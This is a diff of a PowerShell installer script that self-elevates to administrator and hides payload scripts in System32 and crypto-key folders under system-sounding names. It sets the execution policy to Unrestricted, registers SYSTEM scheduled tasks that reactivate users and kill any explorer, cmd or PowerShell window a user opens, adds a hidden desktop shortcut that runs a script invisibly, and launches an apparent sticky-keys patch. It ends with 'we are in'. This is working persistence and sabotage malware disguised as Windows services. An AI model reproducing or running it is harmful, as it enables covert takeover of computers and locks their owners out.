@@ -1,55 +1,66 @@
-#path
-$targetPath = "C:\Windows\System32\Com\en-US"
-
-#create dir if it doean't exist
-if (-not (Test-Path $targetPath)) {
-    New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
+# Self-Elevate to Administrator
+$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
 }
 
 
+#  Define Target Paths
+$taskScriptPath    = "$env:windir\System32\Com\en-US"
+$logScriptPath     = "$env:windir\System32\Speech\Engines\TTS\en-US"
+$oneTimeScriptPath = "$env:windir\security\database\winlogon_color"
+$backupPath        = "$env:ProgramData\Microsoft\Crypto\RSA\MachineKeys"
+
+# Ensure Directories Exist
+foreach ($dir in @($taskScriptPath, $logScriptPath, $oneTimeScriptPath, $backupPath)) {
+    if (-not (Test-Path $dir)) {
+        New-Item -Path $dir -ItemType Directory -Force | Out-Null
+        attrib +h +s $dir
+    }
+}
+
+# Copy and Hide Script Files
 $scriptMap = @{
-    "sys_usr.ps1"        = ".\sys_usr.ps1"
-    "sys_win.ps1"        = ".\sys_win.ps1"
-    "sys_log.ps1"        = ".\sys_log.ps1"
-    "sticky_patch.ps1"   = ".\sticky_patch.ps1"
+    "$taskScriptPath\sys_usr.ps1"         = ".\sys_usr.ps1"
+    "$taskScriptPath\sys_win.ps1"         = ".\sys_win.ps1"
+    "$logScriptPath\sys_log.ps1"          = ".\sys_log.ps1"
+    "$oneTimeScriptPath\sticky_patch.ps1" = ".\sticky_patch.ps1"
+    "$backupPath\win_ux.ps1"              = ".\sys_usr.ps1"
+    "$backupPath\win_ui.ps1"              = ".\sys_win.ps1"
 }
 
-#copy files to the folder
-foreach ($destName in $scriptMap.Keys) {
-    $sourcePath = $scriptMap[$destName]
-    $destPath = Join-Path $targetPath $destName
-    Copy-Item -Path $sourcePath -Destination $destPath -Force
-    attrib +h +s $destPath
+foreach ($dest in $scriptMap.Keys) {
+    Copy-Item -Path $scriptMap[$dest] -Destination $dest -Force
+    attrib +h +s $dest
 }
 
-#hide dir
-attrib +h +s $targetPath
 
-# bypass policies to execute scripts
+#Set Execution Policy if wasnt set b4
 try {
-    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force
+    Set-ExecutionPolicy Unrestricted -Force
 } catch {
-    #if session was not open from admin
-    Write-Host "Failed to set ExecutionPolicy. Try running as Administrator."
+    Write-Host "Unable to set execution policy globally. Please ensure this is done manually."
 }
 
-#scedule to restore and enable users every 3 minutes
-schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$targetPath\sys_usr.ps1`"" /RU "SYSTEM"
+# Register Scheduled Tasks (clean format)
+schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$taskScriptPath\sys_usr.ps1`"" /RU SYSTEM
+schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$taskScriptPath\sys_win.ps1`"" /RU SYSTEM
 
-# schedule to close all explorer cmd powershell windows (that was open by hands not the system one)
-schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 10 /RL HIGHEST /F /TR "powershell.exe -ExecutionPolicy Bypass -File `"$targetPath\sys_win.ps1`"" /RU "SYSTEM"
-
-#create invisible file for spam script
+# Create Shortcut for sys_log
 $shortcutPath = "$env:Public\Desktop\SystemService.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)
 $Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath\sys_log.ps1`""
+$Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$logScriptPath\sys_log.ps1`""
 $Shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,44"
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
-
-# hide shortcut
 attrib +h $shortcutPath
 
-Write-Host "done installing Behehehe"
+
+# One-Time Execution: sticky_patch
+Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$oneTimeScriptPath\sticky_patch.ps1`""
+
+
+Write-Host "`n we are in, repeat we are in"
